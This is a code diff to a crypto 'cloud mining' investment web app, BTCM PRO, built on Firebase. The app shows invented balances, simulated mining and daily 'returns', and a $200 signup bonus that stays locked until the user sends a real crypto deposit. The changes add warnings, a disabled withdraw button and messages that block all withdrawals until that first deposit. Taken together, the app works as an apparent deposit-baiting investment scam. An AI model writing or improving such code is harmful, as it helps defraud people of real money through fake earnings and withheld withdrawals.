@@ -29,6 +29,7 @@
         .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(99,102,241,0.4); }
         .btn-secondary { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); color: #fff; border: 1px solid rgba(255,255,255,0.2); }
         .btn-secondary:hover { background: rgba(255,255,255,0.2); transform: translateY(-2px); }
+        .btn-disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
         input, select, textarea { width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; color: #fff; font-family: inherit; margin-bottom: 12px; transition: all 0.3s ease; }
         input:focus, select:focus { outline: none; border-color: var(--primary); background: rgba(255,255,255,0.1); box-shadow: 0 0 20px rgba(99,102,241,0.2); }
         .bottom-nav-modern { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: calc(100% - 32px); max-width: 400px; background: rgba(15, 20, 35, 0.95); backdrop-filter: blur(20px); display: flex; justify-content: space-around; padding: 10px 16px; border-radius: 50px; border: 1px solid rgba(255,255,255,0.08); z-index: 100; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
@@ -39,6 +40,7 @@
         .page { display: none; padding: 20px; padding-bottom: 100px; max-width: 500px; margin: 0 auto; }
         .page.active { display: block; animation: slideIn 0.4s ease; }
         .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1a1f2e; border-left: 4px solid var(--success); padding: 14px 24px; border-radius: 20px; z-index: 1000; display: flex; align-items: center; gap: 12px; backdrop-filter: blur(20px); box-shadow: 0 10px 40px rgba(0,0,0,0.3); animation: slideIn 0.3s ease; }
+        .notification.error { border-left-color: var(--danger); }
         .mine-btn { width: 200px; height: 200px; background: radial-gradient(circle at 30% 30%, #1a1f2e, #0a0e1a); border: 2px solid var(--primary); border-radius: 50%; margin: 0 auto; display: flex; flex-direction: column; justify-content: center; align-items: center; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 30px rgba(99,102,241,0.2); }
         .mine-btn.mining { animation: pulse 1.5s infinite; box-shadow: 0 0 50px rgba(99,102,241,0.6); border-color: var(--success); }
         .live-ticker { background: rgba(0,0,0,0.4); backdrop-filter: blur(10px); border-radius: 60px; padding: 10px 16px; margin-bottom: 16px; overflow: hidden; white-space: nowrap; font-size: 13px; border: 1px solid rgba(255,255,255,0.08); }
@@ -72,6 +74,7 @@
         .logo-img { width: 36px; height: 36px; border-radius: 12px; object-fit: cover; margin-right: 8px; vertical-align: middle; }
         .auth-logo-img { width: 80px; height: 80px; border-radius: 24px; margin-bottom: 15px; box-shadow: 0 0 30px rgba(99,102,241,0.3); }
         .bonus-timer-card { background: linear-gradient(135deg, rgba(247,147,26,0.15), rgba(255,215,0,0.05)); border-radius: 24px; padding: 16px; margin: 16px 0; text-align: center; }
+        .warning-box { background: rgba(239,68,68,0.15); border: 1px solid var(--danger); border-radius: 16px; padding: 12px; margin-top: 12px; font-size: 13px; text-align: center; }
     </style>
 </head>
 <body>
@@ -151,7 +154,7 @@
                 <div style="margin-top: 16px; padding: 12px; background: rgba(0,0,0,0.3); border-radius: 20px;">
                     <div style="display: flex; justify-content: space-between; font-size: 12px;">
                         <span>Withdraw Eligibility:</span>
-                        <span id="withdrawStatus" style="color: var(--warning);">🔒 Deposit to unlock $200</span>
+                        <span id="withdrawStatus" style="color: var(--warning);">🔒 Deposit required first</span>
                     </div>
                 </div>
             </div>
@@ -244,6 +247,9 @@
             </div>
             <div class="glass-card">
                 <h3>📤 Withdraw Funds <span style="font-size:12px; color:var(--warning);">(Min $10)</span></h3>
+                <div id="withdrawWarningBox" class="warning-box" style="margin-bottom: 15px;">
+                    ⚠️ <strong>First deposit required!</strong> You must complete at least one deposit of $10 or more before you can withdraw any funds.
+                </div>
                 <input type="text" id="withdrawAddress" placeholder="Wallet Address (BTC/USDT/ETH)">
                 <input type="number" id="withdrawAmount" placeholder="Amount (USD)">
                 <select id="withdrawMethod">
@@ -251,10 +257,11 @@
                     <option value="BTC">₿ Bitcoin (BTC)</option>
                     <option value="ETH">⟠ Ethereum (ERC20)</option>
                 </select>
-                <button class="btn btn-primary" onclick="requestWithdraw()" style="width:100%;"><i class="fas fa-arrow-up"></i> Request Withdrawal</button>
+                <button class="btn btn-primary" id="withdrawBtn" onclick="requestWithdraw()" style="width:100%;"><i class="fas fa-arrow-up"></i> Request Withdrawal</button>
                 <p style="font-size:11px; opacity:0.6; margin-top:12px; text-align:center;">
                     <i class="fas fa-info-circle"></i> Fee: 2% | Processing: 0.1-24 hours<br>
-                    ⚠️ Minimum deposit $10 required to unlock $200 bonus!
+                    ⚠️ <strong>No withdrawals allowed before first deposit of minimum $10!</strong><br>
+                    After deposit approval, $200 bonus will be unlocked and you can withdraw.
                 </p>
             </div>
         </div>
@@ -306,7 +313,7 @@
     const storage = firebase.storage();
 
     let currentUser = null, btcPrice = 62650, ethPrice = 3400, bnbPrice = 580;
-    let miningInterval = null, livePriceInterval = null, bonusTimerInterval = null, depositCheckInterval = null, dailyResetInterval = null;
+    let miningInterval = null, livePriceInterval = null, bonusTimerInterval = null, depositCheckInterval = null;
     let qrCodeInstance = null;
 
     const investmentPackages = [
@@ -330,7 +337,6 @@
 
     async function processDailyReturns() { if(!currentUser) return; const now=new Date(); const lastPayout=currentUser.lastDailyPayout?.toDate?.()||new Date(0); const daysDiff=Math.floor((now-lastPayout)/(86400000)); if(daysDiff>0 && currentUser.activePackage){ let pkg=investmentPackages.find(p=>p.name===currentUser.activePackage.name); if(pkg){ let dailyEarn = (currentUser.activePackage.amount * pkg.dailyReturn / 100); let totalEarn = dailyEarn * daysDiff; if(totalEarn>0){ await db.collection('users').doc(currentUser.uid).update({ balance:firebase.firestore.FieldValue.increment(totalEarn), lastDailyPayout:firebase.firestore.Timestamp.fromDate(now), transactions:firebase.firestore.FieldValue.arrayUnion({ type:'daily_return', amount:totalEarn, description:`${pkg.name} daily earnings (${daysDiff} days)`, date:new Date() }) }); showNotification(`Earned $${totalEarn.toFixed(2)} from investments!`,'success'); } } } }
     async function resetTodayEarnings() { if(!currentUser) return; const today=new Date().toDateString(); if(currentUser.lastResetDate!==today){ await db.collection('users').doc(currentUser.uid).update({ todayEarnings:0, lastResetDate:today }); if(currentUser) currentUser.todayEarnings=0; updateDashboard(); } }
-
     function startDailyJobs() { setInterval(()=>processDailyReturns(), 3600000); setInterval(()=>resetTodayEarnings(), 60000); resetTodayEarnings(); }
 
     async function toggleMining(){ if(!currentUser) return; if(!currentUser.isMining){ let miningUntil=Date.now() + 7*86400000; await db.collection('users').doc(currentUser.uid).update({ isMining:true, miningUntil:firebase.firestore.Timestamp.fromMillis(miningUntil) }); currentUser.isMining=true; currentUser.miningUntil={toDate:()=>new Date(miningUntil)}; document.getElementById('mineBtn').classList.add('mining'); document.getElementById('mineText').innerHTML='<i class="fas fa-spinner fa-spin"></i> MINING...'; startMiningLoop(); showNotification('Mining started!'); } else { await db.collection('users').doc(currentUser.uid).update({ isMining:false }); currentUser.isMining=false; document.getElementById('mineBtn').classList.remove('mining'); document.getElementById('mineText').innerHTML='START MINING'; if(miningInterval) clearInterval(miningInterval); showNotification('Mining stopped.'); } }
@@ -341,24 +347,136 @@
 
     function updateBonusTimerUI(){ if(!currentUser) return; if(!currentUser.bonusLocked){ let card=document.getElementById('bonusTimerCard'); if(card) card.innerHTML=`<div style="text-align:center;padding:8px;"><i class="fas fa-check-circle" style="color:#10b981;font-size:28px;"></i><h3>$200 Bonus Unlocked!</h3><p>You can withdraw now.</p></div>`; if(bonusTimerInterval) clearInterval(bonusTimerInterval); return; } if(currentUser.bonusExpiry){ let expiry=currentUser.bonusExpiry.toDate(); let remaining=expiry-Date.now(); if(remaining<=0){ document.getElementById('bonusTimerDisplay').innerHTML="EXPIRED"; document.getElementById('bonusStatusMsg').innerHTML="❌ Bonus expired (no deposit within 7 days)"; if(currentUser.bonusLocked){ db.collection('users').doc(currentUser.uid).update({ bonusLocked:false, transactions:firebase.firestore.FieldValue.arrayUnion({ type:'bonus_expired', amount:0, description:'Signup bonus expired without deposit', date:new Date() }) }); currentUser.bonusLocked=false; } return; } let d=Math.floor(remaining/86400000), h=Math.floor((remaining%86400000)/3600000), m=Math.floor((remaining%3600000)/60000), s=Math.floor((remaining%60000)/1000); document.getElementById('bonusTimerDisplay').innerHTML=`${d}d ${h}h ${m}m ${s}s`; document.getElementById('bonusStatusMsg').innerHTML=currentUser.hasDeposited?"⏳ Deposit approved - bonus unlocking soon":`🔒 Locked - Deposit within ${d}d ${h}h to unlock $200 bonus`; } }
 
-    async function checkAndUnlockBonus(){ if(!currentUser || !currentUser.bonusLocked) return; const approved=await db.collection('depositRequests').where('userId','==',currentUser.uid).where('status','==','approved').limit(1).get(); if(!approved.empty && currentUser.bonusLocked){ await db.collection('users').doc(currentUser.uid).update({ bonusLocked:false, hasDeposited:true, firstDepositApproved:true, transactions:firebase.firestore.FieldValue.arrayUnion({ type:'bonus_unlocked', amount:200, description:'Deposit approved - $200 bonus unlocked', date:new Date() }) }); currentUser.bonusLocked=false; currentUser.hasDeposited=true; updateDashboard(); updateBonusTimerUI(); showNotification('🎉 Deposit approved! $200 bonus unlocked!','success'); } }
+    async function checkAndUnlockBonus(){ if(!currentUser || !currentUser.bonusLocked) return; const approved=await db.collection('depositRequests').where('userId','==',currentUser.uid).where('status','==','approved').limit(1).get(); if(!approved.empty && currentUser.bonusLocked){ await db.collection('users').doc(currentUser.uid).update({ bonusLocked:false, hasDeposited:true, firstDepositApproved:true, transactions:firebase.firestore.FieldValue.arrayUnion({ type:'bonus_unlocked', amount:200, description:'Deposit approved - $200 bonus unlocked', date:new Date() }) }); currentUser.bonusLocked=false; currentUser.hasDeposited=true; updateDashboard(); updateBonusTimerUI(); updateWithdrawButtonState(); showNotification('🎉 Deposit approved! $200 bonus unlocked! Now you can withdraw!','success'); } }
     setInterval(checkAndUnlockBonus,30000);
 
-    async function submitDepositRequest(){ let amount=parseFloat(document.getElementById('depositAmountUsd')?.value); let txHash=document.getElementById('depositTxHash')?.value; if(!amount||amount<10){ showNotification('Min deposit $10','error'); return; } if(!txHash){ showNotification('Transaction hash required','error'); return; } const pending=await db.collection('depositRequests').where('userId','==',currentUser.uid).where('status','==','pending').get(); if(!pending.empty){ showNotification('You already have a pending deposit request.','error'); return; } let coin=COINS[currentCoinIndex]; await db.collection('depositRequests').add({ userId:currentUser.uid, amount, txHash, coin:coin.symbol, status:'pending', submittedAt:new Date() }); showNotification('✅ Deposit request submitted. Await approval.','success'); document.getElementById('depositAmountUsd').value=''; document.getElementById('depositTxHash').value=''; }
+    function updateWithdrawButtonState() {
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        const warningBox = document.getElementById('withdrawWarningBox');
+        if(!currentUser) return;
+        const canWithdraw = currentUser.hasDeposited === true && currentUser.bonusLocked === false;
+        if(!canWithdraw) {
+            if(withdrawBtn) withdrawBtn.classList.add('btn-disabled');
+            if(warningBox) warningBox.style.display = 'block';
+        } else {
+            if(withdrawBtn) withdrawBtn.classList.remove('btn-disabled');
+            if(warningBox) warningBox.style.display = 'none';
+        }
+    }
 
-    async function requestWithdraw(){ let addr=document.getElementById('withdrawAddress').value; let amt=parseFloat(document.getElementById('withdrawAmount').value); let method=document.getElementById('withdrawMethod').value; if(currentUser.bonusLocked){ showNotification('Complete first deposit ($10+) to unlock $200 bonus before withdrawing.','error'); return; } if(!addr){ showNotification('Enter wallet address','error'); return; } if(isNaN(amt)||amt<10){ showNotification('Min $10','error'); return; } if(currentUser.balance<amt){ showNotification('Insufficient balance','error'); return; } let fee=amt*0.02, net=amt-fee; if(!confirm(`Withdraw $${amt}? Fee $${fee.toFixed(2)}. You receive $${net.toFixed(2)}`)) return; await db.collection('withdrawRequests').add({ userId:currentUser.uid, amount:amt, fee, netAmount:net, address:addr, method, status:'pending', requestedAt:new Date() }); let newBal=currentUser.balance-amt; await db.collection('users').doc(currentUser.uid).update({ balance:newBal, transactions:firebase.firestore.FieldValue.arrayUnion({ type:'withdraw_request', amount:amt, description:`Withdrawal request $${amt} to ${method}`, date:new Date() }) }); currentUser.balance=newBal; updateDashboard(); showNotification('Withdrawal request submitted!','success'); document.getElementById('withdrawAmount').value=''; document.getElementById('withdrawAddress').value=''; }
+    async function submitDepositRequest(){ 
+        let amount=parseFloat(document.getElementById('depositAmountUsd')?.value); 
+        let txHash=document.getElementById('depositTxHash')?.value; 
+        if(!amount||amount<10){ showNotification('Min deposit $10','error'); return; } 
+        if(!txHash){ showNotification('Transaction hash required','error'); return; } 
+        const pending=await db.collection('depositRequests').where('userId','==',currentUser.uid).where('status','==','pending').get(); 
+        if(!pending.empty){ showNotification('You already have a pending deposit request.','error'); return; } 
+        let coin=COINS[currentCoinIndex]; 
+        await db.collection('depositRequests').add({ userId:currentUser.uid, amount, txHash, coin:coin.symbol, status:'pending', submittedAt:new Date() }); 
+        showNotification('✅ Deposit request submitted. Await approval.','success'); 
+        document.getElementById('depositAmountUsd').value=''; 
+        document.getElementById('depositTxHash').value=''; 
+    }
 
-    async function handleRegister(){ let name=document.getElementById('regName').value.trim(), email=document.getElementById('regEmail').value.trim().toLowerCase(), pass=document.getElementById('regPass').value, refCode=document.getElementById('refCode').value.trim(); if(!name||!email||!pass){ showNotification('Fill all fields','error'); return; } if(pass.length<6){ showNotification('Password min 6 chars','error'); return; } try { const userCred=await auth.createUserWithEmailAndPassword(email,pass); const user=userCred.user; let referralBonus=0; if(refCode){ const refQuery=await db.collection('users').where('refCode','==',refCode).get(); if(!refQuery.empty){ const refDoc=refQuery.docs[0]; const alreadyReferred=(refDoc.data().referrals||[]).some(r=>r.email===email); if(!alreadyReferred){ await db.collection('users').doc(refDoc.id).update({ balance:firebase.firestore.FieldValue.increment(10), referralBonus:firebase.firestore.FieldValue.increment(10), referrals:firebase.firestore.FieldValue.arrayUnion({ name, email, date:new Date() }) }); referralBonus=10; } } } const newRefCode=Math.random().toString(36).substring(2,8).toUpperCase(); const expiryDate=new Date(Date.now()+7*24*60*60*1000); await db.collection('users').doc(user.uid).set({ uid:user.uid, name, email, balance:200, totalInvested:0, referralBonus, todayEarnings:0, isMining:false, hashrate:0.5, activePackage:null, refCode:newRefCode, referredBy:refCode||null, kycStatus:'pending', twoFactorEnabled:false, walletAddresses:{btc:'',usdt:'',eth:''}, hasDeposited:false, bonusLocked:true, bonusExpiry:firebase.firestore.Timestamp.fromDate(expiryDate), firstDepositApproved:false, miningUntil:null, lastDailyPayout:firebase.firestore.Timestamp.now(), lastResetDate:new Date().toDateString(), transactions:[{ type:'bonus', amount:200, description:'Signup Bonus $200 (locked until first deposit)', date:new Date() }], createdAt:firebase.firestore.FieldValue.serverTimestamp(), referrals:[] }); showNotification('Account created! +$200 locked bonus','success'); } catch(e){ showNotification('Registration failed: '+e.message,'error'); } }
+    async function requestWithdraw(){ 
+        if(!currentUser.hasDeposited || currentUser.bonusLocked){
+            showNotification('❌ Withdrawal not allowed! You must complete a minimum $10 deposit first. After deposit approval, $200 bonus will unlock and you can withdraw.','error');
+            return;
+        }
+        let addr=document.getElementById('withdrawAddress').value; 
+        let amt=parseFloat(document.getElementById('withdrawAmount').value); 
+        let method=document.getElementById('withdrawMethod').value; 
+        if(!addr){ showNotification('Enter wallet address','error'); return; } 
+        if(isNaN(amt)||amt<10){ showNotification('Min $10','error'); return; } 
+        if(currentUser.balance<amt){ showNotification('Insufficient balance','error'); return; } 
+        let fee=amt*0.02, net=amt-fee; 
+        if(!confirm(`Withdraw $${amt}? Fee $${fee.toFixed(2)}. You receive $${net.toFixed(2)}`)) return; 
+        await db.collection('withdrawRequests').add({ userId:currentUser.uid, amount:amt, fee, netAmount:net, address:addr, method, status:'pending', requestedAt:new Date() }); 
+        let newBal=currentUser.balance-amt; 
+        await db.collection('users').doc(currentUser.uid).update({ balance:newBal, transactions:firebase.firestore.FieldValue.arrayUnion({ type:'withdraw_request', amount:amt, description:`Withdrawal request $${amt} to ${method}`, date:new Date() }) }); 
+        currentUser.balance=newBal; 
+        updateDashboard(); 
+        showNotification('Withdrawal request submitted!','success'); 
+        document.getElementById('withdrawAmount').value=''; 
+        document.getElementById('withdrawAddress').value=''; 
+    }
 
-    async function handleLogin(){ let email=document.getElementById('loginEmail').value.trim().toLowerCase(), pass=document.getElementById('loginPassword').value; if(!email||!pass){ showNotification('Enter email & password','error'); return; } try { const cred=await auth.signInWithEmailAndPassword(email,pass); const doc=await db.collection('users').doc(cred.user.uid).get(); if(doc.exists){ currentUser={ uid:cred.user.uid, ...doc.data() }; showNotification('Welcome back!','success'); showApp(); } else throw new Error('No user data'); } catch(e){ showNotification('Login failed: '+e.message,'error'); } }
+    async function handleRegister(){ 
+        let name=document.getElementById('regName').value.trim(), email=document.getElementById('regEmail').value.trim().toLowerCase(), pass=document.getElementById('regPass').value, refCode=document.getElementById('refCode').value.trim(); 
+        if(!name||!email||!pass){ showNotification('Fill all fields','error'); return; } 
+        if(pass.length<6){ showNotification('Password min 6 chars','error'); return; } 
+        try { 
+            const userCred=await auth.createUserWithEmailAndPassword(email,pass); 
+            const user=userCred.user; 
+            let referralBonus=0; 
+            if(refCode){ 
+                const refQuery=await db.collection('users').where('refCode','==',refCode).get(); 
+                if(!refQuery.empty){ 
+                    const refDoc=refQuery.docs[0]; 
+                    const alreadyReferred=(refDoc.data().referrals||[]).some(r=>r.email===email); 
+                    if(!alreadyReferred){ 
+                        await db.collection('users').doc(refDoc.id).update({ balance:firebase.firestore.FieldValue.increment(10), referralBonus:firebase.firestore.FieldValue.increment(10), referrals:firebase.firestore.FieldValue.arrayUnion({ name, email, date:new Date() }) }); 
+                        referralBonus=10; 
+                    } 
+                } 
+            } 
+            const newRefCode=Math.random().toString(36).substring(2,8).toUpperCase(); 
+            const expiryDate=new Date(Date.now()+7*24*60*60*1000); 
+            await db.collection('users').doc(user.uid).set({ uid:user.uid, name, email, balance:200, totalInvested:0, referralBonus, todayEarnings:0, isMining:false, hashrate:0.5, activePackage:null, refCode:newRefCode, referredBy:refCode||null, kycStatus:'pending', twoFactorEnabled:false, walletAddresses:{btc:'',usdt:'',eth:''}, hasDeposited:false, bonusLocked:true, bonusExpiry:firebase.firestore.Timestamp.fromDate(expiryDate), firstDepositApproved:false, miningUntil:null, lastDailyPayout:firebase.firestore.Timestamp.now(), lastResetDate:new Date().toDateString(), transactions:[{ type:'bonus', amount:200, description:'Signup Bonus $200 (locked until first deposit)', date:new Date() }], createdAt:firebase.firestore.FieldValue.serverTimestamp(), referrals:[] }); 
+            showNotification('Account created! +$200 locked bonus','success'); 
+        } catch(e){ let msg=e.message; if(msg.includes('email-already-in-use')) msg='Email already registered'; else if(msg.includes('weak-password')) msg='Password too weak'; showNotification(msg,'error'); } 
+    }
 
-    async function showApp(){ document.getElementById('authPage').style.display='none'; document.getElementById('mainApp').style.display='block'; startLivePrices(); startDailyJobs(); if(currentUser.isMining) startMiningLoop(); loadPackages(); loadLeaderboard(); loadSettingsUI(); updateDashboard(); updateReferralDisplay(); renderCoinSelector(); updateBonusTimerUI(); setInterval(()=>updateBonusTimerUI(),1000); db.collection('users').doc(currentUser.uid).onSnapshot(doc=>{ if(doc.exists){ currentUser={uid:currentUser.uid, ...doc.data()}; updateDashboard(); loadSettingsUI(); updateBonusTimerUI(); } }); setupWithdrawRejectionListener(); }
+    async function handleLogin() {
+        let email = document.getElementById('loginEmail').value.trim().toLowerCase();
+        let password = document.getElementById('loginPassword').value;
+        if (!email || !password) { showNotification('Please enter email and password', 'error'); return; }
+        try {
+            const cred = await auth.signInWithEmailAndPassword(email, password);
+            const doc = await db.collection('users').doc(cred.user.uid).get();
+            if (doc.exists) {
+                currentUser = { uid: cred.user.uid, ...doc.data() };
+                showNotification('Welcome back!', 'success');
+                showApp();
+            } else { showNotification('User data not found', 'error'); }
+        } catch (error) {
+            let friendlyMessage = 'Login failed. Please try again.';
+            switch (error.code) {
+                case 'auth/wrong-password': friendlyMessage = '❌ Incorrect password. Please try again.'; break;
+                case 'auth/user-not-found': friendlyMessage = '❌ No account found with this email.'; break;
+                case 'auth/invalid-email': friendlyMessage = '❌ Invalid email format.'; break;
+                case 'auth/too-many-requests': friendlyMessage = '⚠️ Too many failed attempts. Try again later.'; break;
+                default: friendlyMessage = `Login error: ${error.message}`;
+            }
+            showNotification(friendlyMessage, 'error');
+            document.getElementById('loginPassword').value = '';
+        }
+    }
+
+    async function showApp(){ 
+        document.getElementById('authPage').style.display='none'; 
+        document.getElementById('mainApp').style.display='block'; 
+        startLivePrices(); 
+        startDailyJobs(); 
+        if(currentUser.isMining) startMiningLoop(); 
+        loadPackages(); 
+        loadLeaderboard(); 
+        loadSettingsUI(); 
+        updateDashboard(); 
+        updateReferralDisplay(); 
+        renderCoinSelector(); 
+        updateBonusTimerUI(); 
+        updateWithdrawButtonState();
+        setInterval(()=>updateBonusTimerUI(),1000); 
+        db.collection('users').doc(currentUser.uid).onSnapshot(doc=>{ if(doc.exists){ currentUser={uid:currentUser.uid, ...doc.data()}; updateDashboard(); loadSettingsUI(); updateBonusTimerUI(); updateWithdrawButtonState(); } }); 
+        setupWithdrawRejectionListener(); 
+    }
 
     function setupWithdrawRejectionListener(){ db.collection('withdrawRequests').where('userId','==',currentUser.uid).onSnapshot(snapshot=>{ snapshot.docChanges().forEach(change=>{ if(change.type==='modified'){ let data=change.doc.data(); if(data.status==='rejected' && data.refundProcessed!==true){ db.collection('users').doc(currentUser.uid).update({ balance:firebase.firestore.FieldValue.increment(data.amount), transactions:firebase.firestore.FieldValue.arrayUnion({ type:'refund', amount:data.amount, description:`Withdrawal rejected - refund`, date:new Date() }) }); change.doc.ref.update({ refundProcessed:true }); showNotification(`Withdrawal of $${data.amount} was rejected. Funds returned.`,'error'); } } }); }); }
 
     async function investPackage(amount, pkg){ if(currentUser.balance>=amount){ let newBal=currentUser.balance-amount; let newInvest=(currentUser.totalInvested||0)+amount; await db.collection('users').doc(currentUser.uid).update({ balance:newBal, totalInvested:newInvest, activePackage:{ name:pkg, amount, startDate:new Date() }, hashrate:currentUser.hashrate + (amount*0.02), transactions:firebase.firestore.FieldValue.arrayUnion({ type:'investment', amount, description:`Invested ${pkg}`, date:new Date() }) }); currentUser.balance=newBal; currentUser.totalInvested=newInvest; currentUser.hashrate+=amount*0.02; updateDashboard(); showNotification(`Invested $${amount} in ${pkg}!`); } else showNotification('Insufficient balance','error'); }
 
-    async function updateDashboard(){ if(!currentUser) return; document.getElementById('balanceAmount').innerHTML=`$${currentUser.balance.toFixed(2)}`; document.getElementById('btcBalance').innerHTML=(currentUser.balance/btcPrice).toFixed(8); document.getElementById('estimatedEarnings').innerHTML=`$${(currentUser.hashrate*0.04).toFixed(2)}`; document.getElementById('hashrateText').innerHTML=`Hashrate: ${currentUser.hashrate.toFixed(1)} TH/s`; document.getElementById('todayEarningsStat').innerHTML=`$${(currentUser.todayEarnings||0).toFixed(2)}`; document.getElementById('totalInvestedStat').innerHTML=`$${(currentUser.totalInvested||0).toFixed(2)}`; document.getElementById('referralBonusStat').innerHTML=`$${(currentUser.referralBonus||0).toFixed(2)}`; document.getElementById('hashrateStat').innerHTML=`${currentUser.hashrate.toFixed(1)} TH/s`; let statusSpan=document.getElementById('withdrawStatus'); if(!currentUser.bonusLocked && currentUser.hasDeposited){ statusSpan.innerHTML='✅ Withdraw Available'; statusSpan.style.color='#10b981'; } else if(currentUser.bonusLocked){ statusSpan.innerHTML='⚠️ First deposit required to unlock $200 bonus'; statusSpan.style.color='#f59e0b'; } else { statusSpan.innerHTML='⚠️ Need more balance (Min $10)'; statusSpan.style.color='#f59e0b'; } }
+    async function updateDashboard(){ if(!currentUser) return; document.getElementById('balanceAmount').innerHTML=`$${currentUser.balance.toFixed(2)}`; document.getElementById('btcBalance').innerHTML=(currentUser.balance/btcPrice).toFixed(8); document.getElementById('estimatedEarnings').innerHTML=`$${(currentUser.hashrate*0.04).toFixed(2)}`; document.getElementById('hashrateText').innerHTML=`Hashrate: ${currentUser.hashrate.toFixed(1)} TH/s`; document.getElementById('todayEarningsStat').innerHTML=`$${(currentUser.todayEarnings||0).toFixed(2)}`; document.getElementById('totalInvestedStat').innerHTML=`$${(currentUser.totalInvested||0).toFixed(2)}`; document.getElementById('referralBonusStat').innerHTML=`$${(currentUser.referralBonus||0).toFixed(2)}`; document.getElementById('hashrateStat').innerHTML=`${currentUser.hashrate.toFixed(1)} TH/s`; let statusSpan=document.getElementById('withdrawStatus'); if(currentUser.hasDeposited && !currentUser.bonusLocked){ statusSpan.innerHTML='✅ Withdraw Available'; statusSpan.style.color='#10b981'; } else if(!currentUser.hasDeposited){ statusSpan.innerHTML='🔒 First deposit required ($10 min)'; statusSpan.style.color='#f59e0b'; } else if(currentUser.bonusLocked){ statusSpan.innerHTML='⏳ Deposit approved - unlocking bonus soon'; statusSpan.style.color='#f59e0b'; } }
 
     async function loadLeaderboard(){ let snap=await db.collection('users').orderBy('totalInvested','desc').limit(10).get(); let users=[]; snap.forEach(d=>users.push({id:d.id,...d.data()})); document.getElementById('leaderboardList').innerHTML=users.map((u,i)=>`<div class="leaderboard-item"><div><span class="${i===0?'rank-1':i===1?'rank-2':i===2?'rank-3':''}">${i+1}. </span>${(u.name||'User').substring(0,15)}</div><div>$${(u.totalInvested||0).toFixed(2)}</div></div>`).join(''); let allSnap=await db.collection('users').get(); let all=[]; allSnap.forEach(d=>all.push({id:d.id,...d.data()})); all.sort((a,b)=>(b.totalInvested||0)-(a.totalInvested||0)); let idx=all.findIndex(u=>u.id===currentUser.uid)+1; document.getElementById('userRank').innerHTML=idx>0?`🏆 Your Rank: #${idx} | Invested: $${(currentUser.totalInvested||0).toFixed(2)}`:''; }
 
@@ -377,10 +495,10 @@
     function showReferralStatus(){ alert(`🔗 Your Code: ${currentUser.refCode}\n👥 Referrals: ${(currentUser.referrals||[]).length}\n💰 Bonus: $${(currentUser.referralBonus||0).toFixed(2)}`); }
     function copyReferralLink(){ let link=`https://btcm-pro.github.io/btcm-mining-pro/?ref=${currentUser.refCode}`; navigator.clipboard.writeText(link); showNotification('Referral link copied!'); }
     function updateReferralDisplay(){ document.getElementById('referralLinkDisplay').innerHTML=`https://btcm-pro.github.io/btcm-mining-pro/?ref=${currentUser.refCode}`; }
-    function switchPage(pageId){ document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(pageId).classList.add('active'); let idx={dashboard:0,packages:1,wallet:2,leaderboard:3,settings:4}[pageId]; if(idx!==undefined) document.querySelectorAll('.nav-item-modern')[idx].classList.add('active'); if(pageId==='leaderboard') loadLeaderboard(); if(pageId==='packages') loadPackages(); if(pageId==='wallet') renderCoinSelector(); if(pageId==='settings') loadSettingsUI(); }
+    function switchPage(pageId){ document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(pageId).classList.add('active'); let idx={dashboard:0,packages:1,wallet:2,leaderboard:3,settings:4}[pageId]; if(idx!==undefined) document.querySelectorAll('.nav-item-modern')[idx].classList.add('active'); if(pageId==='leaderboard') loadLeaderboard(); if(pageId==='packages') loadPackages(); if(pageId==='wallet'){ renderCoinSelector(); updateWithdrawButtonState(); } if(pageId==='settings') loadSettingsUI(); }
     async function logout(){ if(miningInterval) clearInterval(miningInterval); if(livePriceInterval) clearInterval(livePriceInterval); if(bonusTimerInterval) clearInterval(bonusTimerInterval); await auth.signOut(); location.reload(); }
-    function showNotification(msg,type='success'){ let n=document.createElement('div'); n.className='notification'; n.innerHTML=`<i class="fas ${type==='success'?'fa-check-circle':'fa-exclamation-circle'}" style="color:${type==='success'?'#10b981':'#f59e0b'}"></i><span>${msg}</span>`; document.body.appendChild(n); setTimeout(()=>n.remove(),3000); }
-    function showNotifications(){ alert('📢 BTCM PRO Updates:\n• Bonus $200 locked until first deposit\n• Deposit within 7 days to unlock\n• Min withdraw $10\n• Daily returns paid automatically'); }
+    function showNotification(msg,type='success'){ let n=document.createElement('div'); n.className='notification '+(type==='error'?'error':''); n.innerHTML=`<i class="fas ${type==='success'?'fa-check-circle':'fa-exclamation-circle'}" style="color:${type==='success'?'#10b981':'#f59e0b'}"></i><span>${msg}</span>`; document.body.appendChild(n); setTimeout(()=>n.remove(),3000); }
+    function showNotifications(){ alert('📢 BTCM PRO Updates:\n• First deposit $10+ required to unlock $200 bonus\n• No withdrawal before first deposit\n• After deposit approval, bonus unlocks\n• Min withdraw $10'); }
     function openModal(id){ document.getElementById(id).classList.add('active'); }
     function closeModal(id){ document.getElementById(id).classList.remove('active'); }
     function selectCoin(idx){ currentCoinIndex=idx; renderCoinSelector(); }
